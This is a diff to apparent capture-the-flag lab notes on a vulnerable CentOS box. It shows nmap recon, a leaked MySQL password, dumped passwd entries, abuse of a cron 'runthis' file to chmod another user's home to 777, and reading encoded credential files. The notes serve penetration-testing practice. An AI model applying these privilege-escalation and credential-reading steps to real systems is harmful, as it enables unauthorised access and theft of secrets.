@@ -2,6 +2,9 @@
 
 Goal: get UID 0 (root) and read the special flag file.
 
+PROBAR
+notes.txt del dir
+
 nmap -sV -O -Pn 192.168.111.135
   PORT   STATE SERVICE VERSION                                                                                                                                                                                                               
   80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
@@ -80,3 +83,24 @@ cd html/fristi
   $password="4ll3maal12#"; // Mysql password
   $db_name="hackmenow"; // Database name
   $tbl_name="members"; // Table name
+
+CentOS release 6.7 (Final)
+
+eezeepz:x:500:500::/home/eezeepz:/bin/bash
+admin:x:501:501::/home/admin:/bin/bash
+fristigod:x:502:502::/var/fristigod:/bin/bash
+fristi:x:503:100::/var/www:/sbin/nologin
+
+cd /home/eezeepz
+more notes.txt
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+echo "/home/admin/chmod -R 777 /home/admin" > runthis
+
+cd /home/admin
+cat whoisyourgodnow.txt
+  =RFn0AKnlMHMPIzpyuTI0ITG
+cat cryptedpass.txt
+  mVGZ3O3omkJLmy2pcuTq
